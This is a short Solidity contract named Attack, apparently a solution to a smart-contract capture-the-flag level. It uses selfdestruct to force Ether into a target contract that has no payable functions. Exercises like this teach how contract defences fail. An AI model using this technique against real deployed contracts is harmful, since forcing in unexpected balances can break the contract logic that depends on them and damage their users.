// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForce {}

contract Attack {
    IForce public target;

    constructor(address _target) {
        target = IForce(_target);
    }

    function attack() public payable {
        selfdestruct(payable(address(target)));
    }

    fallback() external payable {}
    receive() external payable {}
}
